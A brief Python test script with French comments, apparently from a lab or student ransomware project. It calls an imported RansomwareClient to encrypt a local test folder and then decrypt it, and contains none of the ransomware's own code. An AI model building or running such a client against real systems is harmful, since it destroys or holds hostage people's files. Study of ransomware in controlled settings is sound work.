#!/usr/bin/env python3
"""
Script de test automatisé pour le ransomware
"""

from client import RansomwareClient

print("=" * 70)
print("TEST 1: CHIFFREMENT DE dossier_0")
print("=" * 70)

client = RansomwareClient(".")
client.encrypt_directory("dossier_0")

print("\n" + "=" * 70)
print("TEST 2: DÉCHIFFREMENT COMPLET")
print("=" * 70)

client.decrypt_all("dossier_0")

print("\n" + "=" * 70)
print("TESTS TERMINÉS AVEC SUCCÈS!")
print("=" * 70)
